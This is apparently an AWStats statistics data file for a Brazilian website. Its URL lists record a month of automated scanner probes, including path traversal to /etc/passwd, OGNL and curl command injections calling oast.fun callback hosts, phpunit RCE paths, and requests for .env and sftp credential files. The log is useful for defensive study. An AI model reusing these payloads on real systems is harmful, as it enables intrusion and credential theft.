+/webadmin/auth/verification.php 2 https://www.conheca.ilinkbio.com.br/webadmin/start/
+/orders/3 2 -
+/login.php 2 -
+/cgi-bin/mainfunction.cgi 3 -
+/website/blog/ 2 -
+/efile.php 1 -
+/Config/SaveUploadedHotspotLogoFile 2 https://www.conheca.ilinkbio.com.br
+/delsnap.pl 2 -
+/admin/login/index.php 2 -
+/parse 4 -
+/asyncrenderer/%7B%7Burl%7D%7D 2 -
+/icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd 2 -
+/ztp/cgi-bin/handler 2 -
+/axis2/axis2-admin/login 2 -
+/gif.php 1 -
+/lock360.php 2 -
+/default.php 1 -
+/dologin.action 2 -
+/icons/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd 2 -
+/assets/vendor/glightbox/js/'.concat(S,' 2 -
+/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 2 -
+/wp-content/plugins/wpcargo/includes/barcode.php 2 -
+/maint/modules/home/index.php 2 -
+/include/xpnm.txt 2 -
+/.%0d./.%0d./.%0d./.%0d./bin/sh 2 -
+/dashboard/uploadID.php 2 -
+/crowd/plugins/servlet/exp 2 -
+/Ova-Simple.php 1 -
+/wp-content/plugins/imagements/images/32b4qhblhgzuirgculpqealfbvx.php 2 -
+/hexx.php 1 -
+/user/register 2 www.conheca.ilinkbio.com.br/user/register
+/api/users 6 -
+/rest/tinymce/1/macro/preview 2 www.conheca.ilinkbio.com.br
+/ioxi2.php 2 -
+/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/32B4qJfYChTLUlsNb44tTS4ZcgR.jsp 2 -
+/solr/admin/cores 6 -
+/app/rest/users/id:1/tokens/RPC2 4 -
+/file32.php 1 -
+/modules/attributewizardpro/file_upload.php 2 -
+/webtools/control/xmlrpc 2 -
+/wp-content/plugins/import-xml-feed/readme.txt 2 -
+/ws_utc/resources/setting/keystore 2 -
+/laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 2 -
+/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh 3 -
+/wls-wsat/RegistrationRequesterPortType 2 -
+/api/runscript 2 -
+/cgi-bin/supervisor/Factory.cgi 3 -
+/file-manager/backend/makefile 2 -
+/api/32B4qKR0UBv2JeLTGBNxK0jzNqC 2 -
+/RPC2 2 -
+/cgi 4 http://www.conheca.ilinkbio.com.br/mainFrame.htm
+/ajax/render/widget_tabbedcontainer_tab_panel 4 -
+/qil.php 1 -
+/api/hassio/app/.%252e/supervisor/info 2 -
+/foot.php 1 -
+/rpc.cgi 4 https://www.conheca.ilinkbio.com.br/sysinfo.cgi
+/include/makecvs.php 2 -
+/invoker/JMXInvokerServlet/ 2 -
+/soap.cgi 2 -
+/flfhmoi 2 -
+/rsnu.php 1 -
+/file2.php 1 -
+/wsback.php 1 -
+/wp-json/buddypress/v1/signup 2 -
+/wp-omo.php 1 -
+/en/php/usb_sync.php 2 -
+/__ 2 -
+/cgi-bin/mainfunction.cgi/apmcfgupload 6 -
+/assets/img/cta-bg.jpg 1 https://www.conheca.ilinkbio.com.br/assets/css/style.css
+/13.php 1 -
+/cgi-bin/downloadFlile.cgi 3 -
+/home/fpvos.php 2 -
+/pig/add-pig.php 2 -
+/forms/doLogin 2 -
+/assets/vendor/purecounter/purecounter.js.map 1 -
+/service/rest/beta/repositories/bower/group 2 -
+/WebInterface 2 -
+/lv.php 1 -
+/ows 1 -
+/cgi-bin/login.cgi 6 https://www.conheca.ilinkbio.com.br
+/postlocal 1 -
+/pages/createpage.action 2 -
+/common/mlswx.txt 2 -
+/tos/index.php 2 -
+/wp-content/uploads/cfom_files/32b4qiayaupr446zeuvbed8a4yb.php 2 -
+/cyrus.index.php 2 -
+/xwiki/bin/register/XWiki/XWikiRegister 4 -
+/hsqldb%0a 2 -
+/general/index/UploadFile.php 2 -
+/cgi-bin/rpc 3 -
+/login.do 4 -
+/system/sharedir.php 2 -
+/php/setup.php 2 -
+/api/experimental/dags/example_trigger_target_dag/paused/false 2 -
+/js/jquery_file_upload/server/php/ 2 -
+/Tool/uploadfile.php 2 -
+/assets/php/upload.php 4 http://www.conheca.ilinkbio.com.br
+/CMSPages/Staging/SyncServer.asmx/ProcessSynchronizationTaskData 2 -
+/cgi-bin/system_log.cgi 3 -
+/service/rapture/session 2 -
+/jars/upload 2 -
+/_ignition/execute-solution 12 -
+/page 2 -
+/wp-admin/admin-ajax.php 24 -
+/incom/modules/uploader/showcase/script.php 2 -
+/servlet/~ic/bsh.servlet.BshServlet 4 -
+//uapi-cgi/certmngr.cgi 2 -
+/SamlResponseServlet 2 -
+/cgi-bin/touchlist_sync.cgi 3 -
+/webtools/control/forgotPassword/././ProgramExport 4 -
+/controller/ping.php 2 https://www.conheca.ilinkbio.com.br/controller/ping.php
+/backend/backend/auth/signin 2 -
+/storfs-asup 2 -
+/wp-content/plugins/media-library-assistant/includes/mla-stream-image.php 2 -
+/scripts/setup.php 2 -
+/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php 2 -
+/modules/mod_simplefileuploadv1.3/elements/filemanager.php 1 -
+/backupmgt/localJob.php 2 -
+/_search 2 -
+/context.json 4 -
+/aa.php 1 -
+/NgDog/CVE-2023-47246.txt 2 -
+/x 2 -
+/json/setup-restore.action 2 -
+/cgi/networkDiag.cgi 2 -
+/abcd.php 2 -
+/new4.php 2 -
+/backend/.env 1 -
+/seeyon/test123456.jsp 2 -
+/analytics/telemetry/ph/api/hyper/send 2 -
+/php/ping.php 4 -
+/webui_wsma_Http 2 -
+/objects/getSpiritsFromVideo.php 4 -
+/ext.php 1 -
+/pandora_console/ajax.php 4 -
+/class.1.php 1 -
+/atomlib.php 1 -
+/session_login.cgi 4 https://www.conheca.ilinkbio.com.br
+/yDKUbYcDBG.txt 2 -
+/logos_clients/32B4qGkvd7spbM2Kf23LCxSL0jh.php 2 -
+/cmd,/simZysh/register_main/setCookie 2 -
+/webapi/auth 2 -
+/tesla.php 1 -
+/webtools/control/SOAPService 6 -
+/goform/setSysAdm 2 https://www.conheca.ilinkbio.com.br/login.shtml
+/wp-admin/admin.php 2 -
+/pkm.php 1 -
+/webadm/ 4 -
+/seeyon/htmlofficeservlet 2 -
+/php/upload.php 2 https://www.conheca.ilinkbio.com.br
+/hook.php 1 -
+/Synchronization 1 -
+/openmrs/ws/rest/v1/xxxxxx 2 -
+/pages/doenterpagevariables.action 2 -
+/manage/webshell/u 4 -
+/cgi-bin/popen.cgi 6 -
+/wp-json/am-member/license 2 -
+/mgmt/shared/authn/login 6 -
+/user/login 6 -
+/error.php 2 -
+/dataSetParam/verification 4 -
+/ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData 2 -
+/wp-content/uploads/html2wp/32B4qFyPdRccQziyHdjn8EMKXOv.php 2 -
+/CFIDE/adminapi/base.cfc 2 -
+/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 2 -
+/info 1 -
+/webtools/control/ProgramExport 2 -
+/file-manager/backend/text 2 -
+/cgi-bin/mesh.cgi 3 -
+/wp-content/uploads/workreap-temp/32B4qFfAO4RsW1B0qBeai2BwJEP.php 2 -
+/webtools/control/view/StatsSinceStart 2 -
+/enhancecp 1 -
+/api/pull 2 -
+/gm.php 1 -
+/Collector/appliancesettings/applianceSettingsFileTransfer 2 -
+/actions/authenticate.php 2 -
+/ui/auth/login 2 -
+/Servlet/Skins 2 -
+/ssl-vpn/hipreport.esp 2 -
+/saas./resttosaasservlet 2 -
+/jmfi2.php 1 -
+/help/admin-guide/test.jsp 2 -
+/html/ad/adfilestorage/request/checkAcesso.php 2 -
+/OA_HTML/BneViewerXMLService 4 -
+/artifactory/ui/auth/login 2 -
+/console/css/%252e%252e%252fconsole.portal 2 -
+/auth/requestreset 2 -
+/wp-includes/certificates/plugins.php 1 -
+/.env 3 -
+/WoVYdQ.txt 2 -
+/configWizard/keyUpload.jsp 2 -
+/card_scan.php 4 -
+/ajax/api/user/save 2 -
+/v1/32B4qI7QuSjcskcJQwtVmSMhtqO.php 2 -
+/plugins/3rdPartyServers/ox3rdPartyServers/max.class.php 2 -
+/struts2-rest-showcase/orders/3 2 -
+/wp-update.php 1 -
+/upload/userfiles/image/32B4qGiHDCa1R7gxx6JgqoLkTbn.png 2 -
+/uapjs/jsinvoke/ 2 -
+/geoserver/wfs 1 -
+/32B4qJ3Wmlcf69RYSjhAPxCAG8x 2 -
+/API/convertCSVtoParquet.php 1 -
+/pandora_console/index.php 4 -
+/va.php 1 -
+/sitecore/shell/ClientBin/Reporting/Report.ashx 2 -
+/aucxcocoxo.php 1 -
+/ol.php 1 -
+/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 2 -
+/pages/templates2/viewpagetemplate.action 2 -
+/robots.txt 6 -
+/login/index.php 4 -
+/wp-comments-post.php 2 -
+/bin/register/XWiki/XWikiRegister 4 -
+/cgi-bin/mt/mt-xmlrpc.cgi 3 -
+/backupmgt/pre_connect_check.php 2 -
+/goanywhere/lic/accept 2 -
+/ajax.php 2 -
+/YlJp.html 2 -
+/axis2-admin/login 2 -
+/wiki/pages/createpage-entervariables.action 4 -
+/type.php 2 -
+/./RestAPI/Connection 2 -
+/security.txt 1 -
+/checkValid 2 -
+/debug.php 1 -
+/cgi-bin/account_mgr.cgi 12 -
+/api/hassio/app/.%09./supervisor/info 2 -
+/conf_mail.php 2 -
+/lucee/admin/imgProcess.cfm 4 -
+/functionRouter 2 -
+/cgi-bin/readycloud_control.cgi 3 -
+/jolokia/read/getDiagnosticOptions 2 -
+/template/aui/text-inline.vm 2 -
+/login 10 www.conheca.ilinkbio.com.br/module/login/login.html
+/admin/uploads.php 2 -
+/interface-data/books-init 2 https://www.conheca.ilinkbio.com.br
+/./RestAPI/LogonCustomization 4 -
+/api/v2/templates/ 2 -
+/geoserver/ows 1 -
+/adxmlrpc.php 2 -
+/attachment/404/bcabc.php 1 -
+/wp-content/uploads/kaswara/fonts_icon/kodezw/me.php 2 -
+/php_info.php 1 -
+/api/v3/user/orgs 2 -
+/ws/rest/v1/xxxxxx 2 -
+/convert 2 -
+/32B4qG3qVm3ebgZl9m1Yli3FtaN.jsp 2 -
+/wp.php 1 -
+/aucxzso.php 1 -
+/32B4q6M4209mN0N4Z927K3uoFM3.php%5Cx0A 2 -
+/abhgt.php 1 -
+/accounts/login/ 2 -
+/api/experimental/dags/example_trigger_target_dag/dag_runs 2 -
+/ws_utc/resources/setting/options 2 -
+/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20d2ru2kiehk618b0qvi90dkh8mjsy8w4a4.oast.fun%22%29%7D/ 1 -
+/geoserver/wms 2 -
+/wp-content/plugins/media-library-assistant/readme.txt 2 -
+/w3llstore.php 1 -
+/javax.faces.resource/dynamiccontent.properties.xhtml 2 -
+END_SIDER_404
+
+# Host - Pages - Hits - Bandwidth - Last visit date - [Start date of last visit] - [Last page of last visit]
+# [Start date of last visit] and [Last page of last visit] are saved only if session is not finished
+# The 25 first Hits must be first (order not required for others)
+BEGIN_VISITOR 76
+34.200.248.175 787 815 7367562 20250903143002
+89.38.208.127 67 67 503840 20250902132828
+34.11.175.174 19 19 879320 20250908064141
+35.199.40.253 19 19 879320 20250905092921
+34.136.113.111 19 19 879320 20250904044241
+34.82.152.110 19 19 879320 20250911120929
+138.255.203.222 10 55 9449458 20250929202753
+138.0.54.43 6 97 9283351 20250922201511
+14.246.1.20 6 6 0 20250901182822
+205.169.39.58 4 27 7536749 20250916000721
+138.36.49.115 4 33 11302244 20250920080902
+49.12.96.243 4 29 7619578 20250922053525
+189.40.100.198 4 28 7544269 20250915155658
+146.70.185.32 3 10 89287 20250908203725
+167.94.146.54 3 9 211812 20250902050101
+206.168.34.195 2 5 110277 20250904152844
+167.94.138.48 2 2 8742 20250910052526
+199.45.154.159 2 2 8742 20250910075345
+18.221.36.150 2 18 240520 20250927083229
+167.94.146.49 2 2 8742 20250910042815
+18.224.192.118 2 2 17484 20250909044002
+3.239.31.171 2 2 15040 20250925221703
+34.142.176.122 2 2 8742 20250910085845
+35.238.12.27 2 2 92560 20250925055028
+205.210.31.42 1 1 46280 20250917215231
+167.94.145.105 0 2 84051 
+179.108.52.213 0 9 340058 
+177.17.125.109 0 2 82829 
+138.0.54.34 0 13 97760 
+162.142.125.218 1 4 101535 20250909000319
+167.94.146.62 1 4 101535 20250909171840
+167.71.75.99 1 2 84051 20250922110442
+101.198.0.180 1 1 46280 20250911175501
+101.198.0.150 0 1 75309 
+23.239.16.113 1 1 8742 20250913150852
+147.93.157.244 1 1 8742 20250903023810
+34.11.191.204 0 2 82827 
+205.210.31.79 0 1 46280 
+177.54.229.180 0 1 75309 
+143.198.108.5 1 1 8742 20250914112247
+93.159.230.84 1 1 8742 20250920172715
+199.45.154.151 0 2 84051 
+179.151.216.166 0 2 82829 
+198.235.24.55 1 1 46280 20250916214337
+147.185.132.61 1 1 46280 20250912212018
+45.7.26.165 0 1 75309 
+23.105.1.65 1 1 7520 20250905010501
+185.247.137.179 0 1 75309 
+64.23.235.47 1 1 8742 20250928070426
+185.247.137.11 1 1 8742 20250906084521
+185.247.137.21 0 1 8742 
+170.231.134.146 0 2 82829 
+54.162.72.45 0 2 73055 
+205.210.31.72 0 1 46280 
+167.94.138.199 1 4 101535 20250912001546
+138.255.203.132 0 2 82829 
+176.65.148.43 1 1 46280 20250905041123
+206.168.34.79 1 4 101535 20250909012704
+177.23.25.1 0 1 75309 
+45.7.26.71 0 2 150618 
+179.151.214.185 0 3 90349 
+199.45.155.79 1 4 101535 20250912235609
+151.248.88.235 1 1 8742 20250902031748
+177.54.229.178 0 1 75309 
+147.185.132.123 1 1 46280 20250912071311
+66.132.153.133 1 4 101535 20250912023956
+177.55.68.251 0 2 82829 
+34.208.42.16 0 1 75309 
+138.197.135.13 1 2 84051 20250908061833
+177.54.229.179 0 1 75309 
+167.94.138.204 1 3 92793 20250929123524
+35.89.179.159 0 1 75309 
+198.235.24.251 1 1 46280 20250917214122
+216.223.196.216 1 1 8742 20250926180134
+147.185.132.162 1 1 46280 20250917214104
+93.123.109.214 1 1 8742 20250909045301
+END_VISITOR
+
+# Date - Pages - Hits - Bandwidth - Visits
+BEGIN_DAY 28
+20250901 8 13 193104 2
+20250902 69 73 689426 3
+20250903 788 818 7460355 3
+20250904 21 24 989597 2
+20250905 21 21 933120 3
+20250906 1 3 92793 1
+20250907 2 10 164596 1
+20250908 21 23 1038680 3
+20250909 6 16 406140 5
+20250910 8 8 34968 4
+20250911 20 22 1076218 2
+20250912 5 16 481216 5
+20250913 1 3 130331 1
+20250914 1 2 55022 1
+20250915 4 28 7544269 1
+20250916 5 80 8855326 2
+20250917 3 24 500127 3
+20250918 1 10 278567 1
+20250919 0 5 231193 0
+20250920 5 35 11318506 2
+20250922 10 65 15564174 3
+20250924 1 2 53800 1
+20250925 3 3 61320 2
+20250926 1 1 8742 1
+20250927 2 27 580578 1
+20250928 1 1 8742 1
+20250929 11 58 9542251 2
+20250930 0 4 165658 0
+END_DAY
+
+# Session range - Number of visits
+BEGIN_SESSION 5
+30s-2mn 2
+5mn-15mn 1
+30mn-1h 1
+0s-30s 50
+1h+ 2
+END_SESSION
+
+# URL - Pages - Bandwidth - Entry - Exit
+# The 25 first Pages must be first (order not required for others)
+BEGIN_SIDER 485
+/ 285 3141430 45 33
+/index.php 51 445842 0 0
+/wp-admin/admin-ajax.php 12 104898 0 0
+/cgi-sys/suspendedpage.cgi 8 34968 4 4
+/assets/vendor/boxicons/fonts/boxicons.woff2 7 617928 0 1
+/index.action 7 61194 0 0
+/app 7 61194 0 0
+/assets/vendor/bootstrap-icons/fonts/bootstrap-icons.woff2 7 644028 0 1
+/assets/vendor/remixicon/remixicon.woff2 7 751608 0 3
+/_ignition/execute-solution 6 52452 0 0
+/login 6 52452 0 1
+/wls-wsat/CoordinatorPortType 5 43710 0 0
+//blog/wp-includes/wlwmanifest.xml 4 185120 0 0
+//web/wp-includes/wlwmanifest.xml 4 185120 0 0
+//site/wp-includes/wlwmanifest.xml 4 185120 0 0
+/json 4 34968 0 0
+//sito/wp-includes/wlwmanifest.xml 4 185120 0 4
+//website/wp-includes/wlwmanifest.xml 4 185120 0 0
+//wordpress/wp-includes/wlwmanifest.xml 4 185120 0 0
+//news/wp-includes/wlwmanifest.xml 4 185120 0 0
+//xmlrpc.php 4 185120 0 0
+//cms/wp-includes/wlwmanifest.xml 4 185120 0 0
+//test/wp-includes/wlwmanifest.xml 4 185120 0 0
+//2019/wp-includes/wlwmanifest.xml 4 185120 0 0
+//2020/wp-includes/wlwmanifest.xml 4 185120 0 0
+/maint/modules/home/index.php 1 8742 0 0
+/.%0d./.%0d./.%0d./.%0d./bin/sh 1 8742 0 0
+/system/ajax/file 1 7520 0 0
+/dashboard/uploadID.php 1 8742 0 0
+/sites/default/files/webform/submissions 1 7520 0 0
+/crowd/plugins/servlet/exp 1 8742 0 0
+/.atom/remote-ftp.json 1 7520 0 0
+/wp-content/plugins/imagements/images/32b4qhblhgzuirgculpqealfbvx.php 1 8742 0 0
+/sites/default/files/user_uploads 1 7520 0 0
+/contact-us 1 7520 0 0
+/user/register 1 8742 0 0
+/sites/default/files/field/image 1 7520 0 0
+/api/users 3 26226 0 0
+/rest/tinymce/1/macro/preview 1 8742 0 0
+/wp 1 0 0 1
+/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/32B4qJfYChTLUlsNb44tTS4ZcgR.jsp 1 8742 0 0
+/solr/admin/cores 3 26226 0 0
+/app/rest/users/id:1/tokens/RPC2 2 17484 0 0
+/modules/attributewizardpro/file_upload.php 1 8742 0 0
+/feedback 1 7520 0 0
+/webtools/control/xmlrpc 1 8742 0 0
+/ws_utc/resources/setting/keystore 1 8742 0 0
+/file/ajax/field_image 1 7520 0 0
+/template/custom/content-editor 1 8742 0 0
+/ajax/openvpn/del_ovpncfg.php 1 8742 0 0
+/php/change_config.php 2 17484 0 0
+/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 1 8742 0 0
+/webadmin/auth/verification.php 1 8742 0 0
+/login.php 1 8742 0 0
+/orders/3 1 8742 0 0
+/website/blog/ 1 8742 0 0
+/Config/SaveUploadedHotspotLogoFile 1 8742 0 0
+/admin/login/index.php 1 8742 0 0
+/delsnap.pl 1 8742 0 0
+/node/add/form 1 7520 0 0
+/parse 2 17484 0 0
+/asyncrenderer/%7B%7Burl%7D%7D 1 8742 0 0
+/career 1 7520 0 0
+/shell 1 46280 1 1
+/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20d2ru2kiehk618b0qvi90w4cq5t9t6ds9e.oast.fun%22%29%7D/ 1 8742 0 0
+/assets/uploads 1 7520 0 0
+/Wordpress 1 0 0 0
+/ztp/cgi-bin/handler 1 8742 0 0
+/axis2/axis2-admin/login 1 8742 0 0
+/dologin.action 1 8742 0 0
+/sites/default/files/media 1 7520 0 0
+/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 1 8742 0 0
+/wp-content/plugins/wpcargo/includes/barcode.php 1 8742 0 0
+/xwiki/bin/register/XWiki/XWikiRegister 2 17484 0 0
+/cyrus.index.php 1 8742 0 0
+/hsqldb%0a 1 8742 0 0
+/general/index/UploadFile.php 1 8742 0 0
+/login.do 2 17484 0 0
+/system/sharedir.php 1 8742 0 0
+/php/setup.php 1 8742 0 0
+/js/jquery_file_upload/server/php/ 1 8742 0 0
+/api/experimental/dags/example_trigger_target_dag/paused/false 1 8742 0 0
+/Tool/uploadfile.php 1 7520 0 0
+/CMSPages/Staging/SyncServer.asmx/ProcessSynchronizationTaskData 1 8742 0 0
+/assets/php/upload.php 2 17484 0 0
+/jars/upload 1 8742 0 0
+/service/rapture/session 1 8742 0 0
+/page 1 8742 0 0
+/file/ajax/field_file 1 7520 0 0
+/sites/default/files/imported 1 7520 0 0
+/sftp-config.json 1 7520 0 0
+/incom/modules/uploader/showcase/script.php 1 8742 0 0
+/sites/default/files/styles/thumbnail/public 1 7520 0 0
+/SamlResponseServlet 1 8742 0 0
+//uapi-cgi/certmngr.cgi 1 8742 0 0
+/servlet/~ic/bsh.servlet.BshServlet 2 17484 0 0
+/webtools/control/forgotPassword/././ProgramExport 2 17484 0 0
+/sites/default/files/field/documents 1 7520 0 0
+/wls-wsat/RegistrationRequesterPortType 1 8742 0 0
+/laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 1 8742 0 0
+/api/runscript 1 8742 0 0
+/file-manager/backend/makefile 1 8742 0 0
+/api/32B4qKR0UBv2JeLTGBNxK0jzNqC 1 8742 0 0
+/RPC2 1 8742 0 0
+/cgi 2 17484 0 0
+/ajax/render/widget_tabbedcontainer_tab_panel 2 17484 0 0
+/api/hassio/app/.%252e/supervisor/info 1 8742 0 0
+/MagicInfo/PNBPb3.jsp 1 8742 0 0
+/soap.cgi 1 46280 0 0
+/include/makecvs.php 1 8742 0 0
+/rpc.cgi 2 17484 0 0
+/invoker/JMXInvokerServlet/ 1 8742 0 0
+/flfhmoi 1 8742 0 0
+/wp-json/buddypress/v1/signup 1 8742 0 0
+/en/php/usb_sync.php 1 8742 0 0
+/attachment/009900/bcabc.php 1 8742 0 0
+/sites/default/files/private/webform/submissions 1 7520 0 0
+/__ 1 8742 0 0
+/home/fpvos.php 1 8742 0 0
+/form/contact 1 7520 0 0
+/.vscode/ftp-sync.json 1 7520 0 0
+/pig/add-pig.php 1 8742 0 0
+/forms/doLogin 1 8742 0 0
+/WebInterface 1 8742 0 0
+/service/rest/beta/repositories/bower/group 1 8742 0 0
+//CFIDE/adminapi/accessmanager.cfc 1 8742 0 0
+/ows 1 8742 0 0
+/pages/createpage.action 1 8742 0 0
+/postlocal 1 8742 0 0
+/tos/index.php 1 8742 0 0
+/wp-content/uploads/cfom_files/32b4qiayaupr446zeuvbed8a4yb.php 1 8742 0 0
+/openmrs/ws/rest/v1/xxxxxx 1 8742 0 0
+/Synchronization 1 8742 0 0
+/manage/webshell/u 2 17484 0 0
+/pages/doenterpagevariables.action 1 8742 0 0
+/mgmt/shared/authn/login 3 26226 0 0
+/wp-json/am-member/license 1 8742 0 0
+/user/login 3 26226 0 0
+/ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData 1 8742 0 0
+/wp-content/uploads/html2wp/32B4qFyPdRccQziyHdjn8EMKXOv.php 1 8742 0 0
+/dataSetParam/verification 2 17484 0 0
+/CFIDE/adminapi/base.cfc 1 8742 0 0
+/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 1 8742 0 0
+/documents/add 1 7520 0 0
+/webtools/control/ProgramExport 1 8742 0 0
+/file-manager/backend/text 1 8742 0 0
+/wp-content/uploads/workreap-temp/32B4qFfAO4RsW1B0qBeai2BwJEP.php 1 8742 0 0
+/webtools/control/view/StatsSinceStart 1 8742 0 0
+/api/pull 1 8742 0 0
+/Collector/appliancesettings/applianceSettingsFileTransfer 1 8742 0 0
+/ui/auth/login 1 8742 0 0
+/actions/authenticate.php 1 8742 0 0
+/Servlet/Skins 1 8742 0 0
+/saas./resttosaasservlet 1 8742 0 0
+/ssl-vpn/hipreport.esp 1 8742 0 0
+/help/admin-guide/test.jsp 1 8742 0 0
+/.ftpconfig 1 7520 0 0
+/html/ad/adfilestorage/request/checkAcesso.php 1 8742 0 0
+/artifactory/ui/auth/login 1 8742 0 0
+/OA_HTML/BneViewerXMLService 2 17484 0 0
+/node/add/contact 1 7520 0 0
+/console/css/%252e%252e%252fconsole.portal 1 8742 0 0
+/auth/requestreset 1 8742 0 0
+/.env 1 46280 1 1
+/card_scan.php 2 17484 0 0
+/configWizard/keyUpload.jsp 1 8742 0 0
+/controller/ping.php 1 8742 0 0
+/backend/backend/auth/signin 1 8742 0 0
+/storfs-asup 1 8742 0 0
+/wp-content/plugins/media-library-assistant/includes/mla-stream-image.php 1 8742 0 0
+/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php 1 8742 0 0
+/scripts/setup.php 1 8742 0 0
+/backupmgt/localJob.php 1 8742 0 0
+/_search 1 8742 0 0
+/context.json 2 17484 0 0
+/x 1 8742 0 0
+/cgi/networkDiag.cgi 1 8742 0 0
+/json/setup-restore.action 1 8742 0 0
+/uploads 1 7520 0 0
+/seeyon/test123456.jsp 1 8742 0 0
+/analytics/telemetry/ph/api/hyper/send 1 8742 0 0
+/php/ping.php 2 17484 0 0
+/webui_wsma_Http 1 8742 0 0
+/objects/getSpiritsFromVideo.php 2 17484 0 0
+/media/add 1 7520 0 0
+/pandora_console/ajax.php 2 17484 0 0
+/form/submit 1 7520 0 0
+/session_login.cgi 2 17484 0 0
+/logos_clients/32B4qGkvd7spbM2Kf23LCxSL0jh.php 1 8742 0 0
+/webapi/auth 1 8742 0 0
+/cmd,/simZysh/register_main/setCookie 1 8742 0 0
+/webtools/control/SOAPService 3 26226 0 0
+/goform/setSysAdm 1 8742 0 0
+/wp-admin/admin.php 1 8742 0 0
+/seeyon/htmlofficeservlet 1 8742 0 0
+/webadm/ 2 17484 0 0
+/php/upload.php 1 8742 0 0
+/api/hassio/app/.%09./supervisor/info 1 8742 0 0
+/conf_mail.php 1 8742 0 0
+/functionRouter 1 8742 0 0
+/lucee/admin/imgProcess.cfm 2 17484 0 0
+/template/aui/text-inline.vm 1 7520 0 0
+/jolokia/read/getDiagnosticOptions 1 8742 0 0
+/interface-data/books-init 1 8742 0 0
+/admin/uploads.php 1 8742 0 0
+/./RestAPI/LogonCustomization 2 17484 0 0
+/api/v2/templates/ 1 8742 0 0
+/geoserver/ows 1 8742 0 0
+/wp-content/uploads/kaswara/fonts_icon/kodezw/me.php 1 8742 0 0
+/adxmlrpc.php 1 8742 0 0
+/api/v3/user/orgs 1 8742 0 0
+/ws/rest/v1/xxxxxx 1 8742 0 0
+/convert 1 8742 0 0
+/32B4qG3qVm3ebgZl9m1Yli3FtaN.jsp 1 8742 0 0
+/Telerik.Web.UI.WebResource.axd 1 7520 0 0
+/32B4q6M4209mN0N4Z927K3uoFM3.php%5Cx0A 1 8742 0 0
+/wp-json/wp/v2/give_forms/ 1 8742 0 0
+/ws_utc/resources/setting/options 1 8742 0 0
+/api/experimental/dags/example_trigger_target_dag/dag_runs 1 8742 0 0
+/accounts/login/ 1 8742 0 0
+/geoserver/wms 1 8742 0 0
+/javax.faces.resource/dynamiccontent.properties.xhtml 1 8742 0 0
+/api/v1/totp/user-backup-code/../../license/keys-status/%3bcurl%20d2ru2kiehk618b0qvi90esrm69cjzi1ye.oast.fun 1 8742 0 0
+/ajax/api/user/save 1 8742 0 0
+/v1/32B4qI7QuSjcskcJQwtVmSMhtqO.php 1 8742 0 0
+/plugins/3rdPartyServers/ox3rdPartyServers/max.class.php 1 8742 0 0
+/struts2-rest-showcase/orders/3 1 8742 0 0
+/API/convertCSVtoParquet.php 1 8742 0 0
+/32B4qJ3Wmlcf69RYSjhAPxCAG8x 1 8742 0 0
+/uapjs/jsinvoke/ 1 8742 0 0
+/geoserver/wfs 1 8742 0 0
+/sites/default/files 1 7520 0 0
+/sftp.json 2 15040 0 1
+/pandora_console/index.php 2 17484 0 0
+/contact 1 7520 0 0
+/sitecore/shell/ClientBin/Reporting/Report.ashx 1 8742 0 0
+/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 1 8742 0 0
+/.sftp.json 1 7520 0 0
+/pages/templates2/viewpagetemplate.action 1 8742 0 0
+/wp-comments-post.php 1 8742 0 0
+/login/index.php 2 17484 0 0
+/bin/register/XWiki/XWikiRegister 2 17484 0 0
+/backupmgt/pre_connect_check.php 1 8742 0 0
+/sites/default/files/private/webform/submissions/uploads 1 7520 0 0
+/axis2-admin/login 1 8742 0 0
+/YlJp.html 1 8742 0 0
+/goanywhere/lic/accept 1 8742 0 0
+/ajax.php 1 8742 0 0
+/wiki/pages/createpage-entervariables.action 2 17484 0 0
+/type.php 1 8742 0 0
+/./RestAPI/Connection 1 8742 0 0
+/checkValid 1 8742 0 0
+/h0aeabaxnF.php 1 8742 0 0
+/logupload 1 8742 0 0
+/webadmin/tools/unixlogin.php 1 8742 0 0
+/moveitisapi/moveitisapi.dll 2 17484 0 0
+/ajaxPages/writeBrowseFilePathAjax.php 1 8742 0 0
+/clients/editclient.php 1 8742 0 0
+/invoker/readonly 1 8742 0 0
+/bin/view/%22%5d%5d%20%7b%7basync%20async%3d%22true%22%20cached%3d%22false%22%20context%3d%22doc.reference%22%7d%7d%7b%7bpython%7d%7dprint%283724348%20%2a%208473334%29%7b%7b%2fpython%7d%7d%7b%7b%2fasync%7d%7d 1 8742 0 0
+/.vscode/sftp.json 1 7520 0 0
+/sitecore_xaml.ashx/-/xaml/Sitecore.Xaml.Tutorials.Styles.Index 1 8742 0 0
+/userentry 1 8742 0 0
+/cobbler_api 1 8742 0 0
+/bonita/loginservice 1 8742 0 0
+//installer.php 1 8742 1 1
+/WordPress 1 0 0 0
+/arrow.flight.protocol.FlightService/DoPut 1 8742 0 0
+/node/1 1 8742 0 0
+/webform/contact 1 7520 0 0
+/AdminService/urest/v1/LogonResource 1 8742 0 0
+/search/ 2 17484 0 0
+/druid/indexer/v1/sampler 2 17484 0 0
+/webshell.php 1 46280 1 1
+/api/timelion/run 1 8742 0 0
+/model-versions/get-artifact 1 8742 0 0
+/include/file.php 1 8742 0 0
+/bsh.servlet.BshServlet 1 8742 0 0
+/tmui/locallb/workspace/tmshCmd.jsp 3 26226 0 0
